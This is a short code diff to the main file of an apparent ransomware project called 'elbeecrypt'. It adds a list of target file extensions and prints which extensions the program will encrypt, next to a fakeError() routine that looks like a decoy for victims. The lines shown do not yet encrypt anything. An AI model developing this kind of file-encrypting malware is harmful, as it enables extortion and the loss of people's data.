@@ -4,6 +4,8 @@
 #include <vector>
 #include "elbeecrypt/cryptor/main.hpp"
 
+#include "elbeecrypt/common/targets/extensions.hpp"
+
 //Platform-specific includes
 #if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
 	//Definitions
@@ -34,6 +36,10 @@ int main(int argc, char **argv){
 	#endif
 
 	cout << "Encryption routines started!" << endl;
+
+	for(string ext : common::targets::Extensions::encryptable){
+		cout << "I will encrypt '." << ext << "'" << endl;
+	}
 }
 
 /** Impl of fakeError(). */
